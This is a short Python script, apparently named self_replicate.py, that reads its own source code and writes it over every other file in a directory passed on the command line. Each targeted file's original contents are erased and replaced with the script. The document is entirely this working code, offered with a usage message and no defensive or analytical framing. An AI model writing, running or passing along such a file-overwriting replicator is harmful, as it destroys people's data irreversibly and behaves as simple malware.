import os
import sys

def copy_to_files(directory):
    try:
        with open(sys.argv[0], 'r') as current_file:
            script_content = current_file.read()
        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path) and filename != os.path.basename(sys.argv[0]):
                with open(file_path, 'w') as target_file:
                    target_file.write(script_content)
                print(f"Copied to {file_path}")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python self_replicate.py <directory>")
    else:
        target_directory = sys.argv[1]
        copy_to_files(target_directory)
